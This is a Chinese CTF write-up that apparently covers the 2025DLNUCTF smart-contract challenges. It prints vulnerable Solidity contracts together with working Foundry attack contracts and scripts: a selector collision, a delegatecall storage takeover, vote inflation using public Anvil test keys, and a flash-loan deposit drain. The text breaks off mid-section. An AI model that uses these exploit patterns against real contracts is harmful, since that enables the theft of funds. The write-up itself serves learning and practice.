# 2025DLNUCTF wp

怕文件超限制，思路大多都用//打在注释里了，有知识点会单拎出来

# sign in

## 源码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

contract Treasure {
    uint256 public treasureAmount;
    bool public unlocked;
    address public owner;
    uint256 public lockCounter;
    bytes32 private hiddenHash;

    constructor(uint256 _treasureAmount) {
        owner = msg.sender;
        treasureAmount = _treasureAmount;
    }

    modifier onlyEOA() {
        require(msg.sender == tx.origin, "Only EOAs allowed"); //攻击合约
        _;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not the owner");
        _;
    }

    function becomeOwner() external payable returns (address) {
        require(msg.value > treasureAmount, "don't ride for free"); //msg.value
        require(
            msg.sender != tx.origin,
            "The vassal of my appendage is not my appendage"
        );
        owner = msg.sender;
        return owner;
    }

    function setHiddenHash(string memory secret) external onlyOwner {
        hiddenHash = keccak256(bytes(secret));
    }

    function dummyCheck(uint256 x) public view returns (bool) {
        return (x % 42 == 0 && tx.gasprice < 1000000000);
    }

    function getHiddenKey(
        string calldata _string1,
        string calldata _string2
    ) external returns (bool) {
        require(msg.sender == owner, "only owner can set hidden key");
        require(
            keccak256(bytes(_string1)) != keccak256(bytes(_string2)),
            "No two leaves are alike"
        );

        bytes4 sig1 = bytes4(keccak256(bytes(_string1)));
        bytes4 sig2 = bytes4(keccak256(bytes(_string2)));

        if (sig1 == sig2) {
            unlocked = true;
        }

        lockCounter += 1;
        return unlocked;
    }

    function isLegitKey(bytes calldata key) public view returns (bool) {
        return key.length > 12 && key.length < 32;
    }
}

```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

import {Treasure} from "./Treasure.sol";

contract Setup {
    Treasure public treasure;
    bool public solved;
    address internal deployer;

    constructor() payable {
        treasure = new Treasure(1 ether);
        deployer = msg.sender;
    }

    function isSolved() external returns (bool) {
        if (treasure.unlocked()) {
            solved = true;
        }
        return solved;
    }

    function getTreasure() external view returns (address) {
        return address(treasure);
    }

    function withdrawEther() external {
        require(msg.sender == deployer, "Only deployer can withdraw");
        payable(deployer).transfer(address(this).balance);
    }
}

```

## poc

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.9;

import {Treasure} from "./Setup.sol";

contract Attack {
    Treasure public treasure;
    string public a;

    constructor(address addr) {
        treasure = Treasure(addr);
    }

    function attack() external payable {
        treasure.becomeOwner{value: 1.1 ether}();
        treasure.setHiddenHash(a);
        treasure.getHiddenKey(
            "transferFrom(address,address,uint256)",
            "gasprice_bit_ether(int128)" //重点就是这个前四字节函数选择器碰撞,我是从之前做的靶场题wp里摘来的
        );
        require(treasure.unlocked() == true, "not unlocked");
    }
}

```

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.9;

import {Script} from "forge-std/Script.sol";
import {console} from "../lib/forge-std/src/console.sol";
import {Attack} from "../src/Attack.sol";
import {Treasure} from "../src/Setup.sol";

contract Attacksc is Script {
    function run() external {
        vm.startBroadcast();
        Treasure treasure = Treasure(
            0x20e8A6d2Ed794137bB7fEDC2A5991D1A8fCc4afE
        );
        Attack attack = new Attack(0x20e8A6d2Ed794137bB7fEDC2A5991D1A8fCc4afE);
        console.log("EOA balance:", address(msg.sender).balance);
        console.log("Treasure amount:", treasure.treasureAmount());
        attack.attack{value: 1.1 ether}();

        vm.stopBroadcast();
    }
}

```

# 时间大盗

## 源码

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.9;

//主合约
contract EkkoTimeRewind {
    address public owner; //0
    string public constant saying = "U can do Anything in DLNU2025"; //constant不占槽
    bytes4 constant setZDriveownerSignature =
        bytes4(keccak256("setZDriveowner(uint256,uint256)")); //constant不占槽
    address public rewindBeforeTime; //1
    address public rewindAfterTime; //2
    uint256 public Time0; //3
    uint256 public Time1; //4
    bool private isSetZDriveownerCalled = false; //5
    bool private isSetTimeCalled = false; //6
    address public zDriveContractAddress; //7

    constructor(address _zDriveContractAddress) {
        zDriveContractAddress = _zDriveContractAddress;
        rewindBeforeTime = address(this);
        rewindAfterTime = address(this);
        owner = msg.sender;
    }

    function setRewindBeforeTime(uint256 _Time0) public onlyWhitelisted {
        require(!isSetTimeCalled, "setRewindBeforeTime can only be calledonce");
        isSetTimeCalled = true;
        Time0 = _Time0;
    }

    function setRewindAfterTime(uint256 _Time1) public onlyWhitelisted {
        require(!isSetTimeCalled, "setRewindAfterTime can only be called once");
        isSetTimeCalled = true;
        Time1 = _Time1;
    }

    function isSolved() public view returns (bool) {
        return (Time0 != 0 && Time1 != 0 && Time0 > Time1 + 4);
    }

    function setZDriveowner(bytes[] calldata data) public {
        require(
            !isSetZDriveownerCalled,
            "multicallSetZDriveowner has alreadybeen called once"
        );
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (
                !isSetZDriveownerCalled && selector == setZDriveownerSignature
            ) {
                (bool success, ) = zDriveContractAddress.delegatecall(data[i]);

                require(
                    success,
                    "Error while delegating call tosetZDriveowner"
                );
            } else {
                revert("Invalid selector");
            }
        }
        isSetZDriveownerCalled = true;
    }

    function setTime(bytes[] calldata data) public onlyWhitelisted {
        bytes4 rewindBeforeTimeSignature = bytes4(
            keccak256("setRewindBeforeTime(uint256)")
        );
        bytes4 rewindAfterTimeSignature = bytes4(
            keccak256("setRewindAfterTime(uint256)")
        );
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (!isSetTimeCalled && selector == rewindBeforeTimeSignature) {
                (bool success, ) = rewindBeforeTime.delegatecall(data[i]);
                require(
                    success,
                    "Error while delegating call forrewindBeforeTime"
                );
            } else if (
                !isSetTimeCalled && selector == rewindAfterTimeSignature
            ) {
                (bool success, ) = rewindAfterTime.delegatecall(data[i]);
                require(
                    success,
                    "Error while delegating call forrewindAfterTime"
                );
            } else {
                revert("Invalid selector");
            }
        }
    }

    modifier onlyWhitelisted() {
        require(msg.sender == owner, "Not whitelisted");
        _;
    }
}

//委托合约
contract ZDriveContract {
    uint256 public ZDriveowner;//0
    uint256 public Description;//1
    uint256 private callCounter = 0;//2

    event UsefulEvent(string message);

    function setZDriveowner(uint256 _ZDriveowner, uint256 _Description) public {
        ZDriveowner = _ZDriveowner;
        Description = _Description;
        callCounter++;
        emit UsefulEvent("Happy Chinese New Year!");
    }

    function getFlag() public pure returns (string memory) {
        return
            "What are you thinking, kid? Do you really think I can give it to you that easily?";
    }
}

contract Setup {
    EkkoTimeRewind public ekkoTimeRewind;
    ZDriveContract public zDriveContract;

    constructor() {
        zDriveContract = new ZDriveContract();
        ekkoTimeRewind = new EkkoTimeRewind(address(zDriveContract));
    }

    function isSolved() public view returns (bool) {
        return (ekkoTimeRewind.Time0() != 0 &&
            ekkoTimeRewind.Time1() != 0 &&
            ekkoTimeRewind.Time0() > ekkoTimeRewind.Time1() + 4);
    }
}

```

## bytes数组写法

看attack()这一段:

```solidity
 bytes[] memory datas = new bytes[](1);
        datas[0] = abi.encodeWithSelector(
            bytes4(keccak256("setZDriveowner(uint256,uint256)")),
            uint256(uint160(address(this))), //delegatecall委托合约,设置address(this)为owner
            uint256(uint160(address(this))) //设置rewindBeforeTime为address(this)
        );

        ekko.setZDriveowner(datas);
        require(ekko.owner() == address(this), "u r notowner"); //检查这步delegatecall是否成功设置address(this)为owner

        bytes[] memory timeDatas = new bytes[](2);
        bytes memory beforeTime = abi.encodeWithSelector(
            bytes4(keccak256("setRewindBeforeTime(uint256)")),
            7
        ); //delegatecall到攻击合约自己写的这个函数,设置Time0==7
        bytes memory afterTime = abi.encodeWithSelector(
            bytes4(keccak256("setRewindAfterTime(uint256)")),
            2
        ); //delegatecall到攻击合约自己写的这个函数,设置Time1==1
        timeDatas[0] = beforeTime;
        timeDatas[1] = afterTime;
        ekko.setTime(timeDatas);
```

着重注意这种bytes数组怎么写的,格式是什么,写的时候逻辑没啥问题,这个写法卡了好久

## abi.encode四个

源码的两个关键函数`setZDriveowner` 和 `setTime`, 它们都要求传入一个 `bytes[] calldata data`，再通过 `delegatecall` 执行我们传进来的编码数据。这里就要用到 **abi.encode 系列函数**

1. `abi.encode`

按照 ABI 规则，把参数编码成 **标准 ABI 字节数据**（动态长度、32字节对齐）

2. `abi.encodePacked`

把参数按紧凑方式**拼接**,更省gas,不过有哈希碰撞风险

3. `abi.encodeWithSelector`

* 用法:<font style="background-color:#FBDFEF;"> abi.encodeWithSelector(selector, 参数...)  </font>

它会生成 `selector + 参数编码`，正好就是 delegatecall 需要的完整 calldata

```solidity
bytes[] memory timeDatas = new bytes[](2);
        bytes memory beforeTime = abi.encodeWithSelector(
            bytes4(keccak256("setRewindBeforeTime(uint256)")),
            7
        ); //delegatecall到攻击合约自己写的这个setRewindBeforeTime()函数
        bytes memory afterTime = abi.encodeWithSelector(
            bytes4(keccak256("setRewindAfterTime(uint256)")),
            2
        ); 
        timeDatas[0] = beforeTime;
        timeDatas[1] = afterTime;
        ekko.setTime(timeDatas);
```

4. `abi.encodeWithSignature`

和`abi.encodeWithSelector`类似，不过用函数签名字符串来生成 selector , 一般是动态函数调用（依赖字符串签名）

## poc

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {EkkoTimeRewind} from "./1.sol";
import {ZDriveContract} from "./1.sol";

contract Attack {
    address public owner; //0
    address public rewindBeforeTime; //1
    address public rewindAfterTime; //2
    uint256 public Time0; //3
    uint256 public Time1; //4
    bool private isSetZDriveownerCalled = false; //5
    bool private isSetTimeCalled = false; //6
    address public zDriveContractAddress; //7
    EkkoTimeRewind public ekko; //8

    constructor(address addr) {
        ekko = EkkoTimeRewind(addr);
    }

    function setRewindBeforeTime(uint256 _Time0) public {
        Time0 = _Time0;
        rewindAfterTime = address(this); //important!!!因为只设置了rewindBeforeTime为address(this),还差一个rewindAfterTime呢,注意槽位对齐
    }

    function setRewindAfterTime(uint256 _Time1) public {
        Time1 = _Time1;
    }

    function attack() external {
        bytes[] memory datas = new bytes[](1);
        datas[0] = abi.encodeWithSelector(
            bytes4(keccak256("setZDriveowner(uint256,uint256)")),
            uint256(uint160(address(this))), //delegatecall委托合约,设置address(this)为owner
            uint256(uint160(address(this))) //设置rewindBeforeTime为address(this)
        );

        ekko.setZDriveowner(datas);
        require(ekko.owner() == address(this), "u r notowner"); //检查这步delegatecall是否成功设置address(this)为owner

        bytes[] memory timeDatas = new bytes[](2);
        bytes memory beforeTime = abi.encodeWithSelector(
            bytes4(keccak256("setRewindBeforeTime(uint256)")),
            7
        ); //delegatecall到攻击合约自己写的这个函数,设置Time0==7
        bytes memory afterTime = abi.encodeWithSelector(
            bytes4(keccak256("setRewindAfterTime(uint256)")),
            2
        ); //delegatecall到攻击合约自己写的这个函数,设置Time1==1
        timeDatas[0] = beforeTime;
        timeDatas[1] = afterTime;
        ekko.setTime(timeDatas);

        require(ekko.Time0() == 7, "time0 error");
        require(ekko.Time1() == 2, "time1 error");

        require(ekko.isSolved() == true, "no!!!");
    }
}

```

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {Attack} from "../src/Attack.sol";
import {Script} from "forge-std/Script.sol";

contract Attacksc is Script {
    function run() external {
        vm.startBroadcast();
        Attack attack = new Attack(0x9b4cF98D925ffd9D0061023c714889EB517DD472);
        attack.attack();
        vm.stopBroadcast();
    }
}

```

# xiaoheizi

## 源码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ControlVote {
    event VoteDelegated(
        address indexed from,
        address indexed to,
        uint256 amount
    );
    event Voted(address indexed from, address indexed to, uint256 amount);
    event SwappedVotes(address indexed user, uint256 voteAmount);
    event VotesBurned(address indexed user);

    address public owner;
    address public constant competitor =
        0x1000000000000000000000000000000000000010;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public shares;
    mapping(address => uint256) public Votes;
    mapping(address => mapping(uint256 => uint256)) internal isdelegted;

    uint256 constant BITS_PER_WORD = 256;

    constructor() {
        owner = msg.sender;
        Votes[competitor] = 100;
    }

    function addWhitelist(address user) external {
        require(msg.sender == owner, "Not authorized");
        whitelisted[user] = true;
    }

    function joinWhitelist() external {
        require(!whitelisted[msg.sender], "Already joined once");
        require(Votes[msg.sender] >= 1, "Insufficient votes to join");
        whitelisted[msg.sender] = true;
    }

    function setshares(address user, uint256 _votes) external {
        require(msg.sender == owner, "Not authorized");
        shares[user] = _votes;
    }

    function _getIndices(
        address to
    ) internal pure returns (uint256 wordIndex, uint256 bitIndex) {
        uint256 index = uint160(to);
        wordIndex = index / BITS_PER_WORD;
        bitIndex = index % BITS_PER_WORD;
    }

    function grant(address to) external {
        (uint256 wordIndex, uint256 bitIndex) = _getIndices(to);
        isdelegted[msg.sender][wordIndex] |= (1 << bitIndex);
    }

    function revoke(address to) external {
        (uint256 wordIndex, uint256 bitIndex) = _getIndices(to);
        isdelegted[msg.sender][wordIndex] &= ~(1 << bitIndex);
    }

    function isAuthorized(address from, address to) public view returns (bool) {
        (uint256 wordIndex, uint256 bitIndex) = _getIndices(to);
        return (isdelegted[from][wordIndex] >> bitIndex) & 1 == 1;
    }

    function delegate(address from, address to, uint256 _votes) external {
        require(isAuthorized(from, to), "Not authorized");
        require(whitelisted[from] && whitelisted[to], "Not whitelisted");
        require(shares[from] >= _votes, "Insufficient votes");
        require(from != to, "Cannot delegate to self");
        require(_votes > 0, "Votes must be greater than zero");
        shares[from] -= _votes;
        shares[to] += _votes;

        emit VoteDelegated(from, to, _votes);
    }

    function calculateVotingPowerHash(
        address user,
        uint256 salt
    ) external pure returns (bytes32) {
        assembly {
            let ptr := mload(0x40)
            mstore(ptr, user)
            mstore(add(ptr, 0x20), salt)
            mstore(add(ptr, 0x40), xor(user, salt))
            mstore(add(ptr, 0x60), shr(3, salt))
            mstore(add(ptr, 0x80), shl(5, user))
            let hashed := keccak256(ptr, 0xA0)

            mstore(0x0, hashed)
            return(0x0, 32)
        }
    }

    function swap() external {
        require(whitelisted[msg.sender], "Not whitelisted");
        uint256 userVotes = Votes[msg.sender];
        require(userVotes > 0, "No votes to swap");
        Votes[msg.sender] = 0;
        shares[msg.sender] += userVotes;

        emit SwappedVotes(msg.sender, userVotes);
    }

    function vote(address addr, uint256 numbers) public {
        require(whitelisted[msg.sender], "Not whitelisted");
        require(shares[msg.sender] >= numbers, "Insufficient votes");
        require(addr != msg.sender, "Cannot vote for self");
        shares[msg.sender] -= numbers;
        shares[addr] += numbers;
        Votes[addr] += numbers;

        emit Voted(msg.sender, addr, numbers);
    }

    function AssemblyLogic(address user) external view returns (uint256 kun) {
        assembly {
            let v := shr(2, shl(5, 1))
            let val := xor(v, 0x1234)
            kun := add(val, Votes.slot)
        }
    }

    function Optimizer() public view returns (uint256) {
        assembly {
            let t := mul(timestamp(), number())
            let h := blockhash(number())
            let fake := add(t, mod(mload(add(h, 0x20)), 1337))
            mstore(0x0, fake)
            return(0x0, 0x20)
        }
    }

    function buyVotes() external payable {
        require(msg.value >= 1 ether, "Min 1 ether");
        Votes[msg.sender] += msg.value / 1 ether;
    }

    function getVotes(address user) external view returns (uint256) {
        return Votes[user];
    }

    function getShare(address user) external view returns (uint256) {
        return shares[user];
    }

    function burnVotes() external {
        require(whitelisted[msg.sender], "Not whitelisted");
        Votes[msg.sender] = 0;
        emit VotesBurned(msg.sender);
    }

    receive() external payable {}
}

```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./1.sol";

/// @title Setup - Deployment and initialization of the ControlVote challenge
contract Setup {
    ControlVote public controlVote;
    address public immutable competitor;
    address private xiaoheizi1;
    address private xiaoheizi2;
    bool public solved;

    constructor(address _addr1, address _addr2) {
        controlVote = new ControlVote();
        competitor = controlVote.competitor();

        xiaoheizi1 = _addr1;
        xiaoheizi2 = _addr2;

        controlVote.addWhitelist(xiaoheizi1);
        controlVote.addWhitelist(xiaoheizi2);

        controlVote.setshares(xiaoheizi1, 2);
        controlVote.setshares(xiaoheizi2, 2);
    }

    function isSolved() external returns (bool) {
        if (controlVote.Votes(msg.sender) > controlVote.Votes(competitor)) {
            solved = true;
        }
        return solved;
    }
}

```

## 突破点

读槽setup两个xiaoheizi地址,会发现异常眼熟。。。。

**<font style="background-color:#FBDFEF;">其实就是foundry的anvil链账户1和2</font>**，那么这下就有俩账户的私钥了，这个限制解除那不就随便做了

前期一直没看出来这点，给我限制死了

## poc

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.9;

import {ControlVote} from "./1.sol";
import {Setup} from "./setup.sol";

contract Attack {
    //接收票用
    ControlVote public controlvote;
    Setup public setup;
    address public xiaoheizi1;
    address public xiaoheizi2;

    // Competitor public competitor;

    constructor(Setup addr, address _xiaoheizi1, address _xiaoheizi2) {
        setup = Setup(addr);
        controlvote = ControlVote(payable(setup.controlVote()));
        xiaoheizi1 = _xiaoheizi1;
        xiaoheizi2 = _xiaoheizi2;
    }

    function attack() external payable {
        controlvote.buyVotes{value: 1 ether}(); //用1ether买一票
        controlvote.joinWhitelist(); //加入白名单
        controlvote.grant(xiaoheizi1); //授权
        controlvote.grant(xiaoheizi2); //授权
    }

    function go() public payable {
        controlvote.swap(); //票 => share
        controlvote.vote(xiaoheizi1, controlvote.getShare(address(this))); //用share给xiaoheizi1增加票和share
    }

    function go2() external payable {
        //controlvote.swap();//因为检查的是票不是share,所以就不需要这一步了,注意
        require(setup.isSolved() == true, "you are not true xioaehizi"); //检查攻击合约现在的票够不够
    }

    receive() external payable {}
}

```

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.9;

//import {Attack} from "../src/Attack.sol";
import {ControlVote} from "../src/1.sol";
import {Script} from "forge-std/Script.sol";
import {Attack} from "../src/Attack.sol";
import {Setup} from "../src/setup.sol";

contract Attacksc is Script {
    uint256 private constant XIAOHEIZI1_PRIVATE_KEY =
        0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80;
    uint256 private constant XIAOHEIZI2_PRIVATE_KEY =
        0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d;

    address private constant XIAOHEIZI1 =
        0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;
    address private constant XIAOHEIZI2 =
        0x70997970C51812dc3A010C7d01b50e0d17dc79C8;
    address private constant SETUP_ADDRESS =
        0xc4EE942a184325E1e44B1c34FAE33ff2138442d8;

    function run() external {
        vm.startBroadcast();
        Attack attack = new Attack(
            Setup(0xc4EE942a184325E1e44B1c34FAE33ff2138442d8),
            0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266,
            0x70997970C51812dc3A010C7d01b50e0d17dc79C8
        );
        ControlVote controlvote = ControlVote(
            payable(0x61812A5eFdB9Eb0BA0f11A70b661292A91515f5C)
        );
        //Setup setup = Setup(0xc4EE942a184325E1e44B1c34FAE33ff2138442d8);
        vm.stopBroadcast();

        vm.startBroadcast(XIAOHEIZI1_PRIVATE_KEY);
        controlvote.grant(address(attack)); //授权
        controlvote.grant(XIAOHEIZI2); //授权
        vm.stopBroadcast();

        vm.startBroadcast(XIAOHEIZI2_PRIVATE_KEY);
        controlvote.grant(address(attack)); //授权
        controlvote.grant(XIAOHEIZI1); //授权
        vm.stopBroadcast();

        vm.startBroadcast();
        attack.attack{value: 1 ether}(); //打钱
        attack.go();
        vm.stopBroadcast();

        vm.startBroadcast(XIAOHEIZI1_PRIVATE_KEY);
        controlvote.swap(); //以xiaoheizi1视角来把票 => share
        controlvote.vote(address(attack), controlvote.getShare(XIAOHEIZI1)); //用share给攻击合约增加票和share
        vm.stopBroadcast();

        vm.startBroadcast();
        attack.go(); //攻击合约再来
        vm.stopBroadcast();

        vm.startBroadcast(XIAOHEIZI1_PRIVATE_KEY);
        controlvote.swap(); //xioaheizi1再来
        controlvote.vote(address(attack), controlvote.getShare(XIAOHEIZI1));
        vm.stopBroadcast();

        vm.startBroadcast();
        attack.go(); //攻击合约再来
        vm.stopBroadcast();

        vm.startBroadcast(XIAOHEIZI1_PRIVATE_KEY);
        controlvote.swap(); //xioaheizi1再来
        controlvote.vote(address(attack), controlvote.getShare(XIAOHEIZI1));
        vm.stopBroadcast();

        vm.startBroadcast();
        attack.go(); //攻击合约再来
        vm.stopBroadcast();

        vm.startBroadcast(XIAOHEIZI1_PRIVATE_KEY);
        controlvote.swap(); //xioaheizi1再来
        controlvote.vote(address(attack), controlvote.getShare(XIAOHEIZI1));
        vm.stopBroadcast();

        vm.startBroadcast();
        attack.go(); //攻击合约再来
        vm.stopBroadcast();

        vm.startBroadcast(XIAOHEIZI1_PRIVATE_KEY);
        controlvote.swap(); //xioaheizi1再来
        controlvote.vote(address(attack), controlvote.getShare(XIAOHEIZI1));
        vm.stopBroadcast();

        vm.startBroadcast();
        attack.go(); //攻击合约再来
        vm.stopBroadcast();

        vm.startBroadcast(XIAOHEIZI1_PRIVATE_KEY);
        controlvote.swap(); //xioaheizi1再来
        controlvote.vote(address(attack), controlvote.getShare(XIAOHEIZI1)); //最后到这里,用share给攻击合约增加share和票,相当于前边套来的最终都汇总到攻击合约
        vm.stopBroadcast();

        vm.startBroadcast();
        attack.go2(); //issolved检查

        vm.stopBroadcast();
    }
}

```

# magicpool

## 源码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface FlashLoanReceiver {
    function execute() external payable;
}

//0xf1584EC53E6F51Ceb45b3b58983D2Ad8F6D00e43
contract Setup {
    MagicPool public target;

    constructor() payable {
        target = new MagicPool();
        target.deposit{value: 10 ether}();
    }

    function isSolved() external view returns (bool) {
        return (target.totalSupply() == 10 ether && //
            address(target).balance < 1 ether); //要求消耗合约balance到1ether以下
    }

    receive() external payable {}
}

//0x1D554738aCeFe0388E3Bf09815CCd89858525cC9
contract MagicPool {
    mapping(address => uint256) private balances; //0
    mapping(address => mapping(address => uint256)) public allowances; //1
    uint256 public totalSupply; //2
    uint256 public maxloanamount = 10 ether; //3

    event Deposited(address indexed user, uint256 amount);
    event Withdrawn(address indexed user, uint256 amount);
    event FlashLoanExecuted(address indexed borrower, uint256 amount);
    event Received(address indexed sender, uint256 amount);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 amount
    );
    event Transfer(address indexed from, address indexed to, uint256 amount);

    function deposit() external payable {
        //存钱,已经存了10ether
        require(msg.value > 0, "Zero deposit");
        balances[msg.sender] += msg.value;
        totalSupply += msg.value; //totalSupply==10ether
        emit Deposited(msg.sender, msg.value);
    }

    function withdraw() external {
        //取钱
        uint256 amount = balances[msg.sender];
        require(amount > 0, "Nothing to withdraw");
        balances[msg.sender] = 0;
        totalSupply -= amount;
        payable(msg.sender).transfer(amount); //直转给msg.sender
        emit Withdrawn(msg.sender, amount);
    }

    function approve(address spender, uint256 amount) external {
        //授权spender转账额度amount
        allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
    }

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256) {
        return allowances[owner][spender];
    }

    function transferFrom(address owner, address to, uint256 amount) external {
        require(allowances[owner][msg.sender] >= amount, "Not allowed");
        require(balances[owner] >= amount, "Insufficient balance");

        allowances[owner][msg.sender] -= amount; //额度-amount
        balances[owner] -= amount; //owner减amount 银行
        balances[to] += amount; //to加amount 攻击合约

        emit Transfer(owner, to, amount);
    }

    function balanceOf(address user) external view returns (uint256) {
        return balances[user];
    }

    function getPoolBalance() external view returns (uint256) {
        return address(this).balance;
    }

    function flashLoan(uint256 amount) external {
        require(amount <= maxloanamount, "Amount too high");
        uint256 balanceBefore = address(this).balance;
        require(balanceBefore >= amount, "Not enough balance");

        FlashLoanReceiver(msg.sender).execute{value: amount}();

        require(address(this).balance >= balanceBefore, "No money back");
        emit FlashLoanExecuted(msg.sender, amount);
    }

    receive() external payable {
        emit Received(msg.sender, msg.value);
    }
}

```

首先注意到这个接口有个`execute()`函数要我们自己写，那很好了，可以利用这个来骗一骗

## poc

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {MagicPool} from "./1.sol";

contract Attack {
    MagicPool public magicpool;

    constructor(address payable addr) {
        magicpool = MagicPool(payable(addr));
    }

    function attack() external payable {
        magicpool.flashLoan(10 ether); //闪电贷
        magicpool.withdraw(); //取钱
    }

    function execute() external payable {
        magicpool.deposit{value: 10 ether}(); //存钱,这样既能通过还款检查,又能真的存进钱
    }

    receive() external payable {} //别忘记写收款函数
}

```

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {Attack} from "../src/Attack.sol";
import {Script} from "forge-std/Script.sol";
import {MagicPool} from "../src/1.sol";

contract Attacksc is Script {
    function run() external {
        vm.startBroadcast();
        Attack attack = new Attack(
            payable(0x1D554738aCeFe0388E3Bf09815CCd89858525cC9)
        );
        attack.attack(); //掏空目标合约
        require(
            address(0x1D554738aCeFe0388E3Bf09815CCd89858525cC9).balance <
                1 ether,
            "too rich"
        );
        vm.stopBroadcast();
    }
}

```

# greedybluemoon

## 源码

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.9;

contract greedyBlueMoon {
    mapping(address => uint256) private shards; //0
    mapping(address => bool) public challenger; //1
    uint256 private paralysisRing; //2
    address owner; //3 uint160 20字节 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
    uint80 private rates; //3 10字节
    uint8 private bonus; //3 1字节
    uint16 private price; //4 2字节
    uint8 private loot; //4 1字节
    bytes10 private password1; //4 10字节
    mapping(address => uint256) private attackingType; //5
    mapping(address => uint256) private waitTime; //6
    address chainaddr = address(this); //7
    uint256 private lol = 114; //8
    uint256 private L0L = 514; //9
    uint256 private Lo1 = 114514; //10
    bytes32[] private password2; //11
    uint16 public high2Prefix; //12

    constructor(
        uint256 _bonus,
        uint256 _price,
        uint256 _rates,
        uint256 _loot,
        bytes10 _password1,
        bytes8 _password2_1,
        bytes8 _password2_2,
        bytes8 _password2_3,
        bytes8 _password2_4
    ) {
        owner = msg.sender;
        bonus = uint8(_bonus);
        price = uint16(_price);
        rates = uint80(_rates);
        loot = uint8(_loot);
        password1 = _password1;
        password2.push(_password2_1); //0x0175b7a638427703f0dbe7bb9bbf987a2551717b34e79f33b5b1008d1fa01db9 0x8542365815820425000000000000000000000000000000000000000000000000 60274595836892880102263015710152418375603488291410874925448580322562196635648
        password2.push(_password2_2); //0x0175b7a638427703f0dbe7bb9bbf987a2551717b34e79f33b5b1008d1fa01dba 0x9825367458436215000000000000000000000000000000000000000000000000 68817302157005032812774228469416427649423721787519004150499365819006161256448
        password2.push(_password2_3); //0x0175b7a638427703f0dbe7bb9bbf987a2551717b34e79f33b5b1008d1fa01dbb 0x9726841358563224000000000000000000000000000000000000000000000000 68367291876594506866871524762950999141942385624721284791047517844771134504960
        password2.push(_password2_4); //0x0175b7a638427703f0dbe7bb9bbf987a2551717b34e79f33b5b1008d1fa01dbc 0x6952148523852424000000000000000000000000000000000000000000000000 47637872184895342147211396033760031840832789996261776040046097242120792309760
    }

    function transferOwnership(address newOwner) external {
        require(msg.sender != owner, "not owner");
        require(newOwner != address(0), "zero address");
        owner = newOwner;
    }

    function newchallengerBundle() public {
        uint16 high2 = uint16(uint160(msg.sender) >> 144);
        require(challenger[msg.sender] == false, "already claimed");
        require(high2 >= high2Prefix, "Invalid address");
        shards[msg.sender] += bonus;
        challenger[msg.sender] = true;
        high2Prefix += 64;
    }

    function buyShards() public payable {
        uint256 yourMoney = msg.value / rates;
        shards[msg.sender] += yourMoney;
    }

    function fightMob() public {
        waitTime[msg.sender] = block.timestamp + 1 minutes;
        attackingType[msg.sender] = 1;
    }

    function collectingMobLoot() public {
        require((waitTime[msg.sender] < block.timestamp), "Mob is alive");
        require(attackingType[msg.sender] == 1);
        attackingType[msg.sender] = 0;
        shards[msg.sender] += 10;
    }

    function fightBoss() public {
        waitTime[msg.sender] = block.timestamp + 52 weeks;
        attackingType[msg.sender] = 2;
    }

    function collectingBossLoot() public {
        require((waitTime[msg.sender] < block.timestamp), "Boss is alive");
        require(attackingType[msg.sender] == 2);
        attackingType[msg.sender] = 0;
        paralysisRing += 1;
    }

    function transfersOfItems(address to, uint256 value) public {
        require(shards[msg.sender] >= value, "insufficient shards");
        require(msg.sender != to, "don't transfer to yourself");
        shards[msg.sender] -= value;
        shards[to] += value;
    }

    function redeemingParalyzingRing(bytes10 _key1, bytes32 _key2) public {
        require((shards[msg.sender] >= price), "Please use the money power");
        require(
            (keccak256(abi.encodePacked(password1)) ==
                keccak256(abi.encodePacked(_key1))),
            "Wrong Password1."
        );
        bytes32 password_2;
        bytes32 password_2_0 = password2[0];
        bytes32 password_2_1 = password2[1];
        bytes32 password_2_2 = password2[2];
        bytes32 password_2_3 = password2[3];
        password_2 =
            password_2_0 |
            (password_2_1 >> 64) |
            (password_2_2 >> 128) |
            (password_2_3 >> 192);
        require(
            (keccak256(abi.encodePacked(password_2)) ==
                keccak256(abi.encodePacked(_key2))),
            "Wrong Password2."
        );
        shards[msg.sender] -= price;
        paralysisRing += 1;
    }

    function isSolved() public view returns (bool) {
        require(paralysisRing >= 1);
        return true;
    }
}

```

## 读槽 chisel

有个很关键的点是变量打包存储，来看看源码的槽位分布

```solidity
    mapping(address => uint256) private shards; //0
    mapping(address => bool) public challenger; //1
    uint256 private paralysisRing; //2
    address owner; //3 uint160 20字节 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
    uint80 private rates; //3 10字节
